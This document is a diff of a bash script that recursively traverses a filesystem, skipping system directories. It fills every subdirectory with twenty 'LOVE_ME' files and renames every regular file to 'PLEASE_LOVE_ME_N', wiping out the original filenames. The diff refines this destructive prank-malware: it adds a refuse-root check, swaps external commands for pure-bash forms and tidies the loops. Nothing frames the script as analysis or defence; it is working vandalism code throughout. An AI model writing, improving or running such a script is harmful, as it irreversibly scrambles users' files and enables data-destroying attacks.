@@ -1,59 +1,55 @@
 #!/bin/bash
 
-# Absolute no-touch zones
 SKIP_DIRS=(
     /proc /sys /run /dev
     /bin /sbin
     /lib /lib64
     /boot /tmp
-    /usr          
-    /etc          
+    /usr
+    /etc
     /etc/systemd /etc/init.d
 )
 
-should_skip() {
-    local target="$1"
-    # Strip trailing slash for clean comparison
-    target="${target%/}"
+# Safety checks
+[ -d "/usr/bin" ] || { echo "ABORT: /usr/bin missing"; exit 1; }
+if [ "$EUID" -eq 0 ] && [ "$2" != "--allow-root" ]; then
+    echo "ABORT: refusing to run as root"
+    exit 1
+fi
 
+should_skip() {
+    local target="${1%/}"
     for skip in "${SKIP_DIRS[@]}"; do
-        if [ "$target" = "$skip" ]; then
-            return 0  # 0 = true in bash = skip this
-        fi
+        [ "$target" = "$skip" ] && return 0
     done
-    return 1  # 1 = false in bash = don't skip
+    return 1
 }
 
 traverse() {
     local dir="$1"
     local depth="${2:-0}"
-    local indent=$(printf '%*s' "$((depth * 2))" '')
-
-    # echo "${indent}[DIR] $dir"
 
     for entry in "$dir"/*/; do
         [ -e "$entry" ] || continue
+        entry="${entry%/}"
 
-        entry="${entry%/}"  # strip trailing slash
-
-        if should_skip "$entry"; then
-            continue
-        fi
+        should_skip "$entry" && continue
 
         if [ -d "$entry" ]; then
             traverse "$entry" $((depth + 1))
-            
-            for i in {1..20}; do 
-                touch "$entry/LOVE_ME_${i}"
-            done
 
+            # Pure bash - no touch command
+            for i in {1..20}; do
+                > "$entry/LOVE_ME_${i}"
+            done
         fi
     done
 
-    count=50
+    # Pure bash - no dirname command
+    local count=50
     for file in "$dir"/*; do
         [ -f "$file" ] || continue
-        mv "$file" "$(dirname "$file")/PLEASE_LOVE_ME_${count}"
+        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${count}"
         ((count++))
     done
 }
